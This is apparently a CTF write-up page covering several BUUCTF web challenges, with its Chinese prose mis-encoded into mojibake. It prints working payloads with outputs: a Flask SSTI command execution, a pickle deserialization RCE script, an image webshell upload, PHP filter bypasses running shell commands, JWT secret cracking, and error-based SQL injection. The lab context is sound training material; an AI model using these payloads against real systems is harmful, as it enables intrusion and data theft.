if (isset($_POST[&#39;guess&#39;])) {
  $guess = (string) $_POST[&#39;guess&#39;];
  if (hash_equals($secret, $guess)) {
    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
  } else {
    $message = &#39;Wrong.&#39;;
  }
}
?&gt;
&lt;!doctype html&gt;
&lt;html lang=&#34;en&#34;&gt;
  &lt;head&gt;
    &lt;meta charset=&#34;utf-8&#34;&gt;
    &lt;title&gt;Can you guess it?&lt;/title&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;h1&gt;Can you guess it?&lt;/h1&gt;
    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;/p&gt;
    &lt;p&gt;&lt;a href=&#34;?source&#34;&gt;Source&lt;/a&gt;&lt;/p&gt;
    &lt;hr&gt;
&lt;?php if (isset($message)) { ?&gt;
    &lt;p&gt;&lt;?= $message ?&gt;&lt;/p&gt;
&lt;?php } ?&gt;
    &lt;form action=&#34;index.php&#34; method=&#34;POST&#34;&gt;
      &lt;input type=&#34;text&#34; name=&#34;guess&#34;&gt;
      &lt;input type=&#34;submit&#34;&gt;
    &lt;/form&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p><a href="https://bugs.php.net/bug.php?id=62119">PHP :: Bug #62119 :: basename broken with non-ASCII-chars</a></p><p>å‚è€ƒæ–‡ç« </p><p>æ‰¾åˆ°äº†<code>basename()</code>å‡½æ•°çš„ä¸€ä¸ªé—®é¢˜ï¼Œå®ƒä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ï¼š</p><pre tabindex=0><code>/index.php/config.php/%ff?source
</code></pre><p>è¿™é¢˜æœ¬è´¨ä¸Šè€ƒå¯Ÿçš„æ˜¯ä¸€ä¸ªå°trickï¼Œä¸‹é¢æ˜¯éšœçœ¼æ³•</p><h2 id=mrctf2020å¥—å¨ƒ>[MRCTF2020]å¥—å¨ƒ</h2><p>å…ˆçœ‹æºç </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!--
</span></span></span><span style=display:flex><span><span style=color:#75715e>//1st
</span></span></span><span style=display:flex><span><span style=color:#75715e>$query = $_SERVER[&#39;QUERY_STRING&#39;];
</span></span></span><span style=display:flex><span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e> if( substr_count($query, &#39;_&#39;) !== 0 || substr_count($query, &#39;%5f&#39;) != 0 ){
</span></span></span><span style=display:flex><span><span style=color:#75715e>    die(&#39;Y0u are So cutE!&#39;);
</span></span></span><span style=display:flex><span><span style=color:#75715e>}
</span></span></span><span style=display:flex><span><span style=color:#75715e> if($_GET[&#39;b_u_p_t&#39;] !== &#39;23333&#39; &amp;&amp; preg_match(&#39;/^23333$/&#39;, $_GET[&#39;b_u_p_t&#39;])){
</span></span></span><span style=display:flex><span><span style=color:#75715e>    echo &#34;you are going to the next ~&#34;;
</span></span></span><span style=display:flex><span><span style=color:#75715e>}
</span></span></span><span style=display:flex><span><span style=color:#75715e>!--&gt;</span>
</span></span></code></pre></div><p>ç¬¬ä¸€å±‚å‚è€ƒ</p><p><a href=https://www.freebuf.com/articles/web/213359.html>åˆ©ç”¨PHPçš„å­—ç¬¦ä¸²è§£æç‰¹æ€§Bypass - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><pre tabindex=0><code>?b u p t=23333%0a
</code></pre><p>ç¬¬äºŒå±‚</p><p>ç”¨æ§åˆ¶å°è·‘ä¸€ä¸‹</p><pre tabindex=0><code>post me Merak
</code></pre><p>éšä¾¿è¾“å…¥å°±å¯ä»¥è¿›å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span> <span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>); 
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;takeip.php&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#39;open_basedir&#39;</span>,<span style=color:#e6db74>&#39;.&#39;</span>); 
</span></span><span style=display:flex><span><span style=color:#66d9ef>include</span> <span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;Merak&#39;</span>])){ 
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>); 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>(); 
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>change</span>($v){ 
</span></span><span style=display:flex><span>    $v <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>($v); 
</span></span><span style=display:flex><span>    $re <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>; 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($v);$i<span style=color:#f92672>++</span>){ 
</span></span><span style=display:flex><span>        $re <span style=color:#f92672>.=</span> <span style=color:#a6e22e>chr</span> ( <span style=color:#a6e22e>ord</span> ($v[$i]) <span style=color:#f92672>+</span> $i<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span> ); 
</span></span><span style=display:flex><span>    } 
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $re; 
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;Local access only!&#39;</span><span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;br/&gt;&#34;</span>;
</span></span><span style=display:flex><span>$ip <span style=color:#f92672>=</span> <span style=color:#a6e22e>getIp</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($ip<span style=color:#f92672>!=</span><span style=color:#e6db74>&#39;127.0.0.1&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Sorry,you don&#39;t have permission!  Your ip is :&#34;</span><span style=color:#f92672>.</span>$ip;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($ip <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;127.0.0.1&#39;</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>file_get_contents</span>($_GET[<span style=color:#e6db74>&#39;2333&#39;</span>]) <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;todat is a happy day&#39;</span> ){
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;Your REQUEST is:&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>change</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>]);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#a6e22e>file_get_contents</span>(<span style=color:#a6e22e>change</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>])); }
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>å†™ä¸ªåå†™</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$re<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;flag.php&#39;</span>;
</span></span><span style=display:flex><span>$v<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span>($i<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>;$i<span style=color:#f92672>&lt;</span><span style=color:#a6e22e>strlen</span>($re);$i<span style=color:#f92672>++</span>){
</span></span><span style=display:flex><span>    $v<span style=color:#f92672>.=</span><span style=color:#a6e22e>chr</span>(<span style=color:#a6e22e>ord</span>($re[$i])<span style=color:#f92672>-</span>$i<span style=color:#f92672>*</span><span style=color:#ae81ff>2</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$v<span style=color:#f92672>=</span><span style=color:#a6e22e>base64_encode</span>($v);
</span></span><span style=display:flex><span><span style=color:#a6e22e>var_dump</span>($v);
</span></span></code></pre></div><p>è¿™é‡Œä»£ç†ipè¿‡æ»¤äº†å¸¸è§çš„å‡ ä¸ªï¼Œå¯ä»¥ä½¿ç”¨<code>Client-ip</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/secrettw.php?2333<span style=color:#f92672>=</span>data:text/plain,todat is a happy day&amp;file<span style=color:#f92672>=</span>ZmpdYSZmXGI<span style=color:#f92672>=</span>
</span></span></code></pre></div><h2 id=cscctf-2019-qualflasklight>[CSCCTF 2019 Qual]FlaskLight</h2><p>ç”¨fenjingæ¢­å“ˆ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>cat /flasklight/coomme_geeeett_youur_flek
</span></span></code></pre></div><pre tabindex=0><code>{{cycler.next[&#39;__g&#39;&#39;lobals__&#39;].__builtins__.__import__(&#39;os&#39;).popen(&#39;cat /flasklight/coomme_geeeett_youur_flek&#39;).read()}}
</code></pre><h2 id=watevrctf-2019cookie-store>[watevrCTF-2019]Cookie Store</h2><p>çœ‹cookieå€¼base64è§£ç </p><pre tabindex=0><code>{&#34;money&#34;: 100, &#34;history&#34;: []}
eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbXX0=
</code></pre><p>ç„¶åç›´æ¥è´­ä¹°å°±è¡Œäº†</p><h2 id=wustctf2020cv-maker>[WUSTCTF2020]CV Maker</h2><pre tabindex=0><code>Warning: mysqli_set_charset() expects exactly 2 parameters, 1 given in /var/www/html/index.php on line 256
</code></pre><p>å…ˆæ³¨å†Œä¹‹åè¿›å…¥ç½‘é¡µ</p><p>ä¹‹åæ¢å¤´åƒä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡é©¬å¸¦gif89,ç„¶åæŠ“åŒ…æ”¹phpå°±è¡Œï¼Œç„¶åçœ‹ç½‘é¡µæºç å¾—çŸ¥å…·ä½“ä½ç½®ï¼Œæœ€åèšå‰‘è¿ä¸€ä¸‹å¾—åˆ°flag</p><h2 id=ciscn2019-ååŒ—èµ›åŒº-day1-web2ikun>[CISCN2019 ååŒ—èµ›åŒº Day1 Web2]ikun</h2><p>ä¸€ä¸ªç”Ÿæˆçš„ç½‘ç«™ï¼Œæœ‰æç¤ºéœ€è¦ä¹°åˆ°Lv6ï¼Œç„¶åå°±æ²¡æœ‰ç„¶åäº†</p><h2 id=åˆ†æ>åˆ†æ</h2><p>ä¸‹é¢æœ‰å¾ˆå¤šLv2-Lv5çš„ï¼Œå¯ä»¥å°è¯•å†™ä¸ªè„šæœ¬æ‰¾åˆ°ç½‘é¡µ</p><p>ç‚¹å‡»å›¾ç‰‡çœ‹åç§°ï¼Œ<code>src="/static/img/lv/lv3.png"</code>å†™è„šæœ¬çˆ†ä¸€ä¸‹çœ‹çœ‹å“ªé¡µæœ‰lv6.pngçš„å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://c66eb3e7-b146-49bb-b9c7-e58d5fef7173.node5.buuoj.cn:81/shop?page=&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>300</span>):
</span></span><span style=display:flex><span>    response <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url<span style=color:#f92672>+</span>str(i))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#e6db74>&#34;lv6.png&#34;</span> <span style=color:#f92672>in</span> response<span style=color:#f92672>.</span>text:
</span></span><span style=display:flex><span>        print(i)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
</span></span></code></pre></div><p>å¯ä»¥åœ¨181é¡µæ‰¾åˆ°å†…å®¹ï¼Œè¿™é‡Œå…ˆå¸¸è§„æ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œç»™äº†10price</p><img src=D:/blog/source/images/æ¯æ—¥ä¸€é¢˜/2024-09-04155642.png alt=2024-09-04155642 style=zoom:50%><p>å¾ˆæ˜æ˜¾éœ€è¦å°è¯•æ”¹ä¸€ä¸‹å†…å®¹ï¼Œè´­ä¹°çš„æ—¶å€™æŠ“åŒ…ä¸€ä¸‹ï¼ŒæŠŠdiscountæ”¹çš„å¾ˆå°å°±è¡Œ</p><p><img alt=2024-09-04160139 loading=lazy src=d:/blog/source/images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-04160139.png></p><p>ç„¶ååº”è¯¥è€ƒå¯Ÿçš„å†…å®¹æ˜¯cookieçš„å†…å®¹ï¼Œå‘ç°æœ‰jwt,ç”¨jwtç½‘ç«™çœ‹ä¸€ä¸‹å†…å®¹ï¼Œä¿®æ”¹æˆadminéœ€è¦æœ‰å¯†é’¥ï¼Œç”¨å·¥å…·å¯ä»¥è·‘ä¸€ä¸‹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/brendan-rius/c-jwt-cracker.git
</span></span></code></pre></div><p>ç„¶åæ ¹æ®githubä¸Šé¢çš„è¦æ±‚dockerä¸€ä¸‹å°±è¡Œäº†ï¼Œå¾—åˆ°äº†å¯†é’¥è¿›è¡Œä¿®æ”¹ï¼Œå°†æ–°çš„jwtä¿®æ”¹å‘åŒ…åˆ·æ–°ï¼Œçœ‹åˆ°ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œè§£å‹åœ¨Admin.pyé‡Œå‘ç°äº†pickleçš„moudle,æ³¨æ„åˆ°æœ‰pickleçš„åˆ©ç”¨ï¼Œåœ¨è¿™è¾¹è¿›è¡Œçªç ´ï¼Œæœ€åå¾—åˆ°flag</p><p>ç”¨åˆ†æçš„è„šæœ¬æœç´¢ï¼Œè¿›å…¥?page=181,ç„¶åç‚¹å‡»è´­ä¹°å°±è¡ŒæŠ“åŒ…ï¼Œåˆ©ç”¨jwtä¿®æ”¹adminï¼Œéœ€è¦çˆ†ç ´å¯†é’¥</p><p>å¾—åˆ°å¯†é’¥æ˜¯1Kunï¼Œéšåä¿®æ”¹å¾—åˆ°å¯ç”¨çš„jwt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
</span></span></code></pre></div><p>ä¿®æ”¹æˆä¸ºadmin,çœ‹ç½‘é¡µçš„æºç å¾—åˆ°ä¸‹è½½çš„<code>www.zip</code>å®šä½åˆ°Admin.pyé‡Œé¢çš„pickle,æ‰¾åˆ°å…³é”®ä»£ç </p><p>å°è¯•å†™åˆ©ç”¨è„šæœ¬ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç”¨python2çš„ç¯å¢ƒï¼Œè€Œä¸”os.systemå¹¶ä¸ä¼šæˆåŠŸæ‰“é€šï¼Œå¯ä»¥ä½¿ç”¨commandsè¿›è¡Œåˆ©ç”¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pickle
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> commands
</span></span><span style=display:flex><span><span style=color:#66d9ef>class</span> <span style=color:#a6e22e>exp</span>(object):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>def</span> <span style=color:#a6e22e>__reduce__</span>(self):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> (commands<span style=color:#f92672>.</span>getoutput,(<span style=color:#e6db74>&#39;ls /&#39;</span>,))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>orange <span style=color:#f92672>=</span> exp()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(urllib<span style=color:#f92672>.</span>quote(pickle<span style=color:#f92672>.</span>dumps(orange)))
</span></span></code></pre></div><p>å…ˆlsæ‰¾åˆ°äº†flag.txtï¼Œç„¶åcat /flag.txtï¼Œå°±å¯ä»¥å¾—åˆ°flagäº†</p><h2 id=çº¢æ˜è°·ctf-2021write_shell>[çº¢æ˜è°·CTF 2021]write_shell</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>error_reporting</span>(<span style=color:#ae81ff>0</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>highlight_file</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>check</span>($input){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/&#39;| |_|php|;|~|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>^|</span><span style=color:#ae81ff>\\</span><span style=color:#e6db74>+|eval|{|}/i&#34;</span>,$input)){
</span></span><span style=display:flex><span>        <span style=color:#75715e>// if(preg_match(&#34;/&#39;| |_|=|php/&#34;,$input)){
</span></span></span><span style=display:flex><span>        <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#39;hacker!!!&#39;</span>);
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> $input;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>waf</span>($input){
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>is_array</span>($input)){
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>foreach</span>($input <span style=color:#66d9ef>as</span> $key<span style=color:#f92672>=&gt;</span>$output){
</span></span><span style=display:flex><span>          $input[$key] <span style=color:#f92672>=</span> <span style=color:#a6e22e>waf</span>($output);
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>  }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>      $input <span style=color:#f92672>=</span> <span style=color:#a6e22e>check</span>($input);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$dir <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;sandbox/&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>md5</span>($_SERVER[<span style=color:#e6db74>&#39;REMOTE_ADDR&#39;</span>]) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;/&#39;</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>file_exists</span>($dir)){
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>mkdir</span>($dir);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#66d9ef>switch</span>($_GET[<span style=color:#e6db74>&#34;action&#34;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#34;&#34;</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;pwd&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> $dir;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>case</span> <span style=color:#e6db74>&#39;upload&#39;</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        $data <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#34;data&#34;</span>] <span style=color:#f92672>??</span> <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>waf</span>($data);
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>file_put_contents</span>(<span style=color:#e6db74>&#34;</span><span style=color:#e6db74>$dir</span><span style=color:#e6db74>&#34;</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;index.php&#34;</span>, $data);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><p>å…ˆè¾“å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://c75cb75c-dba5-447f-89ba-1cb4150b1e78.node5.buuoj.cn:81/?action<span style=color:#f92672>=</span>pwd
</span></span></code></pre></div><p>çœ‹ä¸€ä¸‹è·¯å¾„</p><pre tabindex=0><code>sandbox/fc3f8d0d99ccdde85c8cfc624fe94c32/
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>http://c75cb75c-dba5-447f-89ba-1cb4150b1e78.node5.buuoj.cn:81/?action<span style=color:#f92672>=</span>upload&amp;data<span style=color:#f92672>=</span>&lt;?echo%09<span style=color:#e6db74>`</span>ls%09/<span style=color:#e6db74>`</span>?&gt;
</span></span></code></pre></div><pre tabindex=0><code>flllllll1112222222lag
http://c75cb75c-dba5-447f-89ba-1cb4150b1e78.node5.buuoj.cn:81/?action=upload&amp;data=&lt;?echo%09`cat%09/flllllll1112222222lag`?&gt;
</code></pre><p>æœ€åå¾—åˆ°flag</p><h2 id=rctf2015easysql>[RCTF2015]EasySQL</h2><p>å…ˆæ³¨å†Œ</p><pre tabindex=0><code>admin&#39;#
</code></pre><p>ç„¶åå†ç™»å½•</p><p>å‘ç°æ²¡æœ‰ä¸œè¥¿ï¼Œåº”è¯¥æ˜¯äºŒæ¬¡æ³¨å…¥ï¼Œç”¨bpæ¥fuzzä¸€ä¸‹</p><pre tabindex=0><code>1	length 	200	false	false	521	
3	handler	200	false	false	521	
4	like	200	false	false	521	
5	select 	200	false	false	521	
6	sleep	200	false	false	521	
8	delete	200	false	false	521	
13	BENCHMARK	200	false	false	521	
15	left	200	false	false	521	
17	insert	200	false	false	521	
20	right	200	false	false	521	
25	handler	200	false	false	521	
26	-- -	200	false	false	521	
36	&lt;&gt;	200	false	false	521	
39	&lt;	200	false	false	521	
44	AND	200	false	false	521	
56	length 	200	false	false	521	
61	ascii	200	false	false	521	
62	select 	200	false	false	521	
64	left	200	false	false	521	
65	right	200	false	false	521	
74	/**/	200	false	false	521	
75	anandd	200	false	false	521	
82	LEFT	200	false	false	521	
84	sleep	200	false	false	521	
85	LIKE	200	false	false	521	
95	ORDER	200	false	false	521	
96	ORD	200	false	false	521	
110	AND	200	false	false	521	
114	delete	200	false	false	521	
126	DELETE	200	false	false	521	
128	floor	200	false	false	521	
129	rand()	200	false	false	521	
136	ORD	200	false	false	521	
139	order 	200	false	false	521	
142	ORDER	200	false	false	521	
143	OUTFILE	200	false	false	521	
156	benchmark	200	false	false	521	
159	substring	200	false	false	521	
160	ord	200	false	false	521	
164	VARCHAR	200	false	false	521	
169	`	200	false	false	521	
170	  	200	false	false	521	
173	%0a	200	false	false	521	
175	mid	200	false	false	521	
179	RLIKE	200	false	false	521	
181	sys schemma	200	false	false	521	
185	FLOOR	200	false	false	521	
187	INFILE	200	false	false	521	
189	%0c	200	false	false	521	
191	%0d	200	false	false	521	
194	@	200	false	false	521	
</code></pre><p>è¿‡æ»¤äº†ä»¥ä¸Šå†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>1</span><span style=color:#e6db74>&#39;|show(database())#
</span></span></span></code></pre></div><p>ä¸è¡Œ</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x7e,database(),0x7e),1))#
</span></span></span></code></pre></div><p>æœ‰æŠ¥é”™</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x7e,database(),0x7e),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>XPATH syntax error: &#39;~web_sqli~&#39;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>XPATH syntax error: &#39;:article,flag,users&#39;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>XPATH syntax error: &#39;:flag&#39;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(flag)from(flag))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>XPATH syntax error: &#39;:RCTF{Good job! But flag not her&#39;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>XPATH syntax error: &#39;:name,pwd,email,real_flag_1s_here&#39;
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(real_flag_1s_here)from(users))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Subquery returns more than 1 row
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>flag{bbcb1bb3-5d0b-4c78-afea-77
